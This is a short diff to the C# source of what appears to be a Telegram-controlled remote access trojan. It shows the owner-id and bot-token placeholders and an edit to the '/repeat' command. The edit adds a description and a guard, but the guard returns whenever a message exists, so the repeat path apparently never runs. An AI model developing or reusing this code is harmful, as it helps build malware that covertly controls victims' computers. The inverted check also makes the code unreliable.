@@ -29,7 +29,6 @@ namespace TelegramRAT
     {
         static TelegramBotClient Bot;
 
-
         readonly static long? OwnerId = null; // Place your Telegram id here or keep it null.
         readonly static string BotToken = null; // Place your Telegram bot token. 
 
@@ -1749,13 +1748,21 @@ namespace TelegramRAT
             {
                 Command = "/repeat",
 
+                Description = "Repeat command by replying to a message",
+
                 Execute = model =>
                 {
+                    if (model.Message != null)
+                    {
+                        Bot.SendTextMessageAsync(model.Message.Chat.Id, "Reply to message", replyToMessageId: model.Message.MessageId);
+                        return;
+                    }
                     BotCommandModel newmodel = BotCommandModel.FromMessage(model.Message.ReplyToMessage);
 
                     if (newmodel == null)
                     {
                         Bot.SendTextMessageAsync(model.Message.Chat.Id, "Unable to repeat command from this message");
+                        return;
                     }
 
                     var cmd = CommandsList.Find(command => command.Command == newmodel.Command);
